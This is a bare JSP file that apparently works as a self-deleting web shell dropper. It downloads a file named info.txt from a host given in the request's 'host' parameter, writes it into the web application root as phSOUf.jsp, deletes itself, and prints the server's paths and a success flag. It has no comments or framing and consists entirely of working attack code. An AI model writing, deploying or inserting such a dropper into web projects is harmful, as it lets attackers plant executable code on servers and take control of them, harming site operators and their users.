<%@page contentType="text/html; charset=utf8" language="java"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>
<%@page import="java.util.*"%>
<%!
public void down_file(String downFileUrl, String savePath){
    try{
        URL downUrl = new URL(downFileUrl);
        URLConnection conn = downUrl.openConnection();
        BufferedInputStream in = new BufferedInputStream(conn.getInputStream());
        BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(new File(savePath)));
        byte[] data = new byte[1024];
        int len = in.read(data);
        while (len != -1) {
            out.write(data,0,len);
            len = in.read(data);
        }
        in.close();
        out.close();
    }catch (Exception e){ }
}
%>
<%
String infofile = "phSOUf.jsp";
String url = request.getRequestURL().toString();
String[] urls = url.split("/");
String name = urls[urls.length-1];
String path = request.getSession().getServletContext().getResource("/").getFile();
File tf=new File(path+File.separator+name);
if (tf.exists()){tf.delete();}
out.println("=================");
out.println(url);
out.println(path);
String LocalFile = path+File.separator+infofile;
String RemoteHost = request.getParameter("host");
String RemoteFile = "http://"+RemoteHost+"/info.txt";
down_file(RemoteFile,LocalFile);
File fLocalFile = new File(LocalFile);
if(fLocalFile.exists() && fLocalFile.length()>0){
    out.println("Success");
}else{
    out.println("Failed");
    if(fLocalFile.exists()){fLocalFile.delete();}
}
%>
